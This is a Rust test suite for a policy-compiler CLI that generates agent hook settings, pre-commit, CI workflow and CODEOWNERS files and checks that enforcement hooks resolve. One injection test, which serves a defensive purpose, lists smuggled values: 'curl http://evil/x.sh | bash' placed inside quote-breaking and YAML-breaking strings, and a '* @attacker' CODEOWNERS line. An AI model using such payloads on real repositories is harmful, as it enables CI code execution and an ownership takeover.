use super::enforce::{aoa_stdin, hook_payload, observe_enforce};
use super::*;

#[test]
fn policy_compile_writes_three_planes_idempotently() {
    let repo = TempDir::new().unwrap();
    std::fs::write(
        repo.path().join("aoa-policy.yaml"),
        "protected_paths: [\"migrations/**\"]\ngateway_allowlist: [\"src/db/gateway.rs\"]\n",
    )
    .unwrap();

    let compile = || {
        aoa_stdin()
            .args(["policy", "compile", "--repo", repo.path().to_str().unwrap()])
            .assert()
            .success();
    };
    compile();

    let settings = repo.path().join(".claude/settings.json");
    let precommit = repo.path().join(".pre-commit-config.yaml");
    let workflow = repo.path().join(".github/workflows/aoa-policy.yml");
    let owners = repo.path().join(".github/CODEOWNERS");
    for p in [&settings, &precommit, &workflow, &owners] {
        assert!(p.exists(), "missing plane artifact: {}", p.display());
    }
    let snapshot: Vec<String> = [&settings, &precommit, &workflow, &owners]
        .iter()
        .map(|p| std::fs::read_to_string(p).unwrap())
        .collect();

    // Re-compile: every artifact is byte-stable.
    compile();
    for (p, before) in [&settings, &precommit, &workflow, &owners]
        .iter()
        .zip(&snapshot)
    {
        assert_eq!(
            &std::fs::read_to_string(p).unwrap(),
            before,
            "{} not idempotent",
            p.display()
        );
    }
    // CI workflow embeds the protected glob; CODEOWNERS lists the gateway.
    assert!(snapshot[2].contains("'migrations/**'"));
    assert!(snapshot[3].contains("src/db/gateway.rs @owners"));
}

#[test]
fn policy_compile_rejects_artifact_injection_before_writing_any_plane() {
    let payloads = [
        "a' ; curl http://evil/x.sh | bash ; '",
        "safe/**\n      - name: Injected\n        run: curl http://evil/x.sh | bash",
        "m.rs @owners\n* @attacker",
    ];

    for field in ["protected_paths", "gateway_allowlist"] {
        for payload in payloads {
            let repo = TempDir::new().unwrap();
            let escaped = payload
                .replace('\\', "\\\\")
                .replace('"', "\\\"")
                .replace('\n', "\\n");
            std::fs::write(
                repo.path().join("aoa-policy.yaml"),
                format!("{field}: [\"{escaped}\"]"),
            )
            .unwrap();

            aoa_stdin()
                .args(["policy", "compile", "--repo", repo.path().to_str().unwrap()])
                .assert()
                .failure()
                .stderr(predicate::str::contains(format!("unsafe value in {field}")));

            for artifact in [
                ".pre-commit-config.yaml",
                ".github/workflows/aoa-policy.yml",
                ".github/CODEOWNERS",
            ] {
                assert!(
                    !repo.path().join(artifact).exists(),
                    "{field} payload {payload:?} wrote {artifact}"
                );
            }
        }
    }
}

#[test]
fn policy_compile_emits_gitattributes_marking_for_generated_paths() {
    let repo = TempDir::new().unwrap();
    std::fs::write(
        repo.path().join("aoa-policy.yaml"),
        "generated_paths:\n  - glob: \"**/*.gen.rs\"\n    source: \"schema.json\"\n",
    )
    .unwrap();
    // A pre-existing user entry must survive the compile (non-destructive merge).
    let gitattributes = repo.path().join(".gitattributes");
    std::fs::write(&gitattributes, "* text=auto\n").unwrap();

    let compile = || {
        aoa_stdin()
            .args(["policy", "compile", "--repo", repo.path().to_str().unwrap()])
            .assert()
            .success();
    };
    compile();

    let attrs = std::fs::read_to_string(&gitattributes).unwrap();
    // User content preserved + the R6 entry and provenance header emitted.
    assert!(attrs.contains("* text=auto"), "user line preserved");
    assert!(attrs.contains("**/*.gen.rs linguist-generated -diff"));
    assert!(attrs.contains("@generated"));
    assert!(attrs.contains("schema.json"));

    // Idempotent: a second compile rewrites byte-identical content.
    compile();
    assert_eq!(std::fs::read_to_string(&gitattributes).unwrap(), attrs);
}

#[test]
fn policy_guard_staged_rejects_protected_file() {
    let repo = TempDir::new().unwrap();
    std::fs::write(
        repo.path().join("aoa-policy.yaml"),
        "protected_paths: [\"migrations/**\"]\n",
    )
    .unwrap();

    // A protected staged file fails the pre-commit guard.
    aoa_stdin()
        .args([
            "policy",
            "guard-staged",
            "--repo",
            repo.path().to_str().unwrap(),
        ])
        .arg("migrations/0001.sql")
        .assert()
        .failure()
        .stderr(predicate::str::contains("protected path"));

    // An ordinary file passes.
    aoa_stdin()
        .args([
            "policy",
            "guard-staged",
            "--repo",
            repo.path().to_str().unwrap(),
        ])
        .arg("src/lib.rs")
        .assert()
        .success();
}

#[test]
fn enforce_ignores_non_mutation_tools() {
    let repo = TempDir::new().unwrap();
    // A Read is not a guarded mutation: allowed even with no reproduction.
    aoa_stdin()
        .args(["enforce", "check"])
        .write_stdin(hook_payload("Read", None, repo.path()))
        .assert()
        .success();
}

#[test]
fn observe_enforce_writes_idempotent_settings_and_plain_observe_does_not() {
    let repo = TempDir::new().unwrap();
    let settings = repo.path().join(".claude/settings.json");

    observe_enforce(repo.path());
    let first = std::fs::read_to_string(&settings).expect("settings written");
    assert!(first.contains(".claude/hooks/aoa-enforce"));
    for verb in ["check", "record"] {
        assert!(
            first.contains(&format!("exec \\\"$h\\\" {verb} ")),
            "the {verb} hook must run the wrapper: {first}"
        );
    }
    // A bare `aoa ...` is the inert form this repo shipped for months: the
    // hooks resolve only where the binary happens to be on the host's PATH,
    // and where it is not they fail non-blocking and enforcement silently
    // never runs (aoa-zsem6). Reintroducing it must fail here.
    assert!(
        !first.contains("\\\"aoa enforce"),
        "hook commands must not be bare `aoa ...`: {first}"
    );
    // So is a cwd-relative wrapper path: it resolves from the repo root and
    // exits 127 — a non-blocking warning — from anywhere else.
    assert!(
        !first.contains("CLAUDE_PROJECT_DIR:-."),
        "hook commands must not fall back to the cwd: {first}"
    );

    // Re-running is byte-stable (idempotent merge).
    observe_enforce(repo.path());
    let second = std::fs::read_to_string(&settings).unwrap();
    assert_eq!(first, second, "second observe --enforce must be a no-op");

    // Plain observe (no --enforce) installs no hook.
    let plain = TempDir::new().unwrap();
    aoa_stdin()
        .args(["observe", "--repo", plain.path().to_str().unwrap()])
        .assert()
        .success();
    assert!(!plain.path().join(".claude/settings.json").exists());
}

/// The audit's runtime-hook plane check is existence-only, so without this
/// test a change to the generated hook entries would silently strand the
/// repo's committed `.claude/settings.json` (aoa-vrx.3) on the old shape
/// while the gating self-audit kept passing.
#[test]
fn tracked_settings_json_matches_observe_enforce_output() {
    let fresh = TempDir::new().unwrap();
    observe_enforce(fresh.path());
    let generated = std::fs::read_to_string(fresh.path().join(".claude/settings.json"))
        .expect("observe --enforce writes settings.json");

    let tracked_path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../..")
        .join(".claude/settings.json");
    let tracked = std::fs::read_to_string(&tracked_path)
        .expect("repo-root .claude/settings.json is tracked (runtime-hook plane)");

    assert_eq!(
        tracked, generated,
        "tracked .claude/settings.json drifted from `aoa observe --enforce` output; \
         regenerate it with `cargo run -p aoa -- observe --repo . --enforce`"
    );
}

#[test]
fn observe_reports_missing_and_stale_enforce_hook_stamps() {
    for (settings, expected) in [
        (serde_json::json!({"hooks": {}}), "missing"),
        (
            serde_json::json!({
                "hooks": {},
                "aoa": {"enforce_hook_set_version": 0}
            }),
            "behind",
        ),
        (
            serde_json::json!({
                "hooks": {},
                "aoa": {"enforce_hook_set_version": 999}
            }),
            "ahead",
        ),
        (
            serde_json::json!({
                "hooks": {},
                "aoa": {"enforce_hook_set_version": "old"}
            }),
            "malformed",
        ),
    ] {
        let repo = TempDir::new().unwrap();
        std::fs::create_dir_all(repo.path().join(".claude")).unwrap();
        std::fs::write(
            repo.path().join(".claude/settings.json"),
            serde_json::to_vec(&settings).unwrap(),
        )
        .unwrap();

        aoa_stdin()
            .args(["observe", "--json", "--repo"])
            .arg(repo.path())
            .assert()
            .success()
            .stdout(predicate::str::contains("enforce_hook_warning"))
            .stdout(predicate::str::contains(expected))
            .stdout(predicate::str::contains(".claude/settings.json"));
    }
}

#[test]
fn current_enforce_hook_stamp_is_quiet_in_observe_and_audit() {
    let repo = TempDir::new().unwrap();
    observe_enforce(repo.path());

    let settings: Value =
        serde_json::from_slice(&std::fs::read(repo.path().join(".claude/settings.json")).unwrap())
            .unwrap();
    assert_eq!(
        settings["aoa"]["enforce_hook_set_version"], 3,
        "installer must stamp the hook-set version"
    );

    for command in ["observe", "audit"] {
        aoa_stdin()
            .args([command, "--json", "--repo"])
            .arg(repo.path())
            .assert()
            .success()
            .stdout(predicate::str::contains("enforce_hook_warning").not());
    }
}

#[test]
fn audit_surfaces_a_stale_hook_stamp_in_both_registers() {
    let repo = TempDir::new().unwrap();
    std::fs::create_dir_all(repo.path().join(".claude")).unwrap();
    std::fs::write(
        repo.path().join(".claude/settings.json"),
        r#"{"aoa":{"enforce_hook_set_version":0}}"#,
    )
    .unwrap();

    for json in [false, true] {
        let mut command = aoa_stdin();
        command.arg("audit");
        if json {
            command.arg("--json");
        }
        command
            .arg("--repo")
            .arg(repo.path())
            .assert()
            .success()
            .stdout(predicate::str::contains("behind"))
            .stdout(predicate::str::contains(".claude/settings.json"));
    }
}

/// The wrapper is what makes the hooks resolvable, so the installer must write
/// it alongside the settings that point at it. Settings naming a file that does
/// not exist is the installed-but-inert state this whole path removes.
#[test]
fn observe_enforce_installs_an_executable_wrapper() {
    let repo = TempDir::new().unwrap();
    observe_enforce(repo.path());

    let wrapper = repo.path().join(".claude/hooks/aoa-enforce");
    let metadata = std::fs::metadata(&wrapper).expect("wrapper installed beside settings.json");
    assert!(metadata.is_file());
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert!(
            metadata.permissions().mode() & 0o111 != 0,
            "wrapper must be executable or every hook fails to run"
        );
    }
}

/// Criteria (a) and (b) of aoa-zsem6, checked the way the host runs a hook:
/// `/bin/sh` with a scrubbed environment and no login profile.
///
/// The cwd is deliberately *outside* the repository. Running from the repo root
/// is the one directory where a cwd-relative command resolves by luck, so a test
/// that stays there cannot tell resolution from coincidence — that is how the
/// `"${CLAUDE_PROJECT_DIR:-.}"` fallback passed while exiting 127 (a
/// non-blocking warning, so the write proceeded) everywhere else.
///
/// With the binary reachable the configured command resolves and exits 0. With
/// it absent the hook must say so — the blocking `check` denies rather than
/// waving the write through, the advisory hooks exit non-zero so the host
/// surfaces them, and neither is silent. A bare `aoa <verb>` command form fails
/// this test at the first assertion, which is what keeps it from coming back.
#[cfg(unix)]
#[test]
fn the_configured_hook_command_resolves_and_is_loud_when_the_binary_is_absent() {
    let repo = TempDir::new().unwrap();
    observe_enforce(repo.path());
    let elsewhere = TempDir::new().unwrap();

    let settings: Value =
        serde_json::from_slice(&std::fs::read(repo.path().join(".claude/settings.json")).unwrap())
            .unwrap();
    let configured = |event: &str, verb: &str| {
        let command = settings["hooks"][event][0]["hooks"][0]["command"]
            .as_str()
            .unwrap_or_else(|| panic!("{event} {verb} hook is installed"))
            .to_string();
        assert!(
            command.contains(&format!(" {verb} ")),
            "expected the {verb} hook command, found {command}"
        );
        command
    };
    let check = configured("PreToolUse", "check");
    let record = configured("PostToolUse", "record");

    let run = |command: &str, project_dir: Option<&Path>, aoa_bin: Option<&Path>| {
        let mut sh = std::process::Command::new("/bin/sh");
        sh.env_clear()
            .current_dir(elsewhere.path())
            .arg("-c")
            .arg(command);
        if let Some(dir) = project_dir {
            sh.env("CLAUDE_PROJECT_DIR", dir);
        }
        if let Some(bin) = aoa_bin {
            sh.env("AOA_BIN", bin);
        }
        sh.output().expect("hook command runs under /bin/sh")
    };

    // (a) Resolution: reachable binary, scrubbed environment, foreign cwd,
    // exit 0. `--help` rides through the command's own `"$@"`.
    let bin = assert_cmd::cargo::cargo_bin("aoa");
    let help = run(&format!("{check} --help"), Some(repo.path()), Some(&bin));
    let help_err = String::from_utf8_lossy(&help.stderr);
    assert!(
        help.status.success(),
        "configured hook command must resolve from any cwd; stderr: {help_err}"
    );
    assert!(
        !help_err.contains("not found"),
        "configured hook command must not fail to resolve; stderr: {help_err}"
    );

    // (b) Loud on absent binary: no AOA_BIN, no PATH, no build outputs here.
    // And loud on an unfindable wrapper, which is the failure the command's own
    // guard owns: an unset CLAUDE_PROJECT_DIR must deny, not exit 127.
    for (verb, command, expected_code) in [("check", &check, 2), ("record", &record, 1)] {
        for (case, project_dir) in [
            ("binary absent", Some(repo.path())),
            ("CLAUDE_PROJECT_DIR unset", None),
        ] {
            let unavailable = run(command, project_dir, None);
            let stderr = String::from_utf8_lossy(&unavailable.stderr);
            assert_eq!(
                unavailable.status.code(),
                Some(expected_code),
                "unavailable enforcement must not read as passing ({verb}, {case}); stderr: {stderr}"
            );
            assert!(
                stderr.contains("ENFORCEMENT UNAVAILABLE"),
                "unavailable enforcement must be explicit, not silent ({verb}, {case}); stderr: {stderr}"
            );
        }
    }
}

/// The repo's own wrapper is generated, like its settings.json. Without this
/// the two drift and the committed copy keeps whatever an editor left behind.
#[test]
fn tracked_wrapper_matches_observe_enforce_output() {
    let fresh = TempDir::new().unwrap();
    observe_enforce(fresh.path());
    let generated = std::fs::read_to_string(fresh.path().join(".claude/hooks/aoa-enforce"))
        .expect("observe --enforce writes the wrapper");

    let tracked_path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../..")
        .join(".claude/hooks/aoa-enforce");
    let tracked = std::fs::read_to_string(&tracked_path)
        .expect("repo-root .claude/hooks/aoa-enforce is tracked (runtime-hook plane)");

    assert_eq!(
        tracked, generated,
        "tracked .claude/hooks/aoa-enforce drifted from `aoa observe --enforce` output; \
         regenerate it with `cargo run -p aoa -- observe --repo . --enforce`"
    );
}

/// A current stamp over a deleted wrapper is the same lie as a bare command:
/// the settings read as installed while nothing can run.
#[test]
fn a_missing_wrapper_is_reported_even_when_the_stamp_is_current() {
    let repo = TempDir::new().unwrap();
    observe_enforce(repo.path());
    std::fs::remove_file(repo.path().join(".claude/hooks/aoa-enforce")).unwrap();

    aoa_stdin()
        .args(["observe", "--json", "--repo"])
        .arg(repo.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("enforce_hook_warning"))
        .stdout(predicate::str::contains("is missing"));
}
